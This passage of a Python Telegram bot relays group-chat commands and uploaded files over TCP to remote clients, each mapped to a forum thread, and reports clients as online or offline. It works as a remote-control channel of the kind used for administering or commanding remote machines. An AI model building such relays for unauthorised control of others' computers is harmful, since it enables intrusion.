        fsize = file_info.file_size

        # 4. FORMATION OF THE FINAL NAME
        # If base_name (from the command) is set, use it + extension.
        if base_name:
            fname = base_name + ext
        else:
            fname = orig_name or f"file_{int(time.time())}{ext}"
            
        downloaded = io.BytesIO()
        await bot.download_file(file_path, downloaded)

        # 5. SENDING TO THE CLIENT
        # Pass the CORRECT NAME (fname) in the metadata!
        payload = json.dumps({"command": "/upload", "file_name": fname, "file_size": fsize}, ensure_ascii=False).encode('utf-8') + b'\n'
        writer.write(payload)
        await writer.drain()
        
        writer.write(downloaded.getvalue())
        await writer.drain() 
        
        logger.info(f"File {fname} ({fsize}B) sent to the client. I'm waiting Confirmations...")
        
        await message.reply(f"✅ File *{fname}* ({fsize}B) sent to the client. Wait for confirmation to save.")
             
    except Exception as e:
        await message.reply(f"❌ Loading error: {e}")
        logger.error(f"Upload TG: {e}")
        

@dp.message(F.text.startswith('/'), IsInGroup())
async def handle_generic_command(message: Message):
    thread_id = message.message_thread_id
    text = message.text
    
    # 1. Extract the command without arguments or mention
    cmd_part = text.lower().split()[0]
    pure_cmd_name = cmd_part.split('@')[0]

    # 💥 BLOCKING UPLOAD
    if pure_cmd_name == "/upload":
        await message.reply("❌ To upload a file, send the file itself to this chat, not the command.")
        return
        
    # 2. Processing bot mentions (Leave your code, it is correct)
    if '@' in cmd_part:
        # Your code is here
        cmd, botname = cmd_part.split('@', 1)
        if botname.lower() != BOT_USERNAME:
            return
        text = cmd + text[len(cmd_part):] # Clear the command
        
    # 3. SEARCHING FOR A CLIENT (KeyError: 0 occurs here)
    # This line causes an error if clients contains a dictionary instead of a tuple.
    _, _, writer = await find_client_by_thread(thread_id)
    
    if not writer:
        await message.reply("❌ Offline")
        return
    try:
        payload = json.dumps({"command": text}).encode('utf-8') + b'\n'
        writer.write(payload)
        await writer.drain()
    except Exception as e:
        await message.reply(f"❌ {e}")

async def main():
    global BOT_USERNAME, CLIENT_HISTORY_CACHE
    # 🔥 Initialize history at startup
    CLIENT_HISTORY_CACHE = await load_client_history()
    me = await bot.get_me()
    BOT_USERNAME = me.username.lower()
    logger.info(f"bot @{BOT_USERNAME}")
    asyncio.create_task(tcp_server())
    asyncio.create_task(check_clients_status())
    await dp.start_polling(bot, skip_updates=True)

if __name__ == "__main__":
    asyncio.run(main())
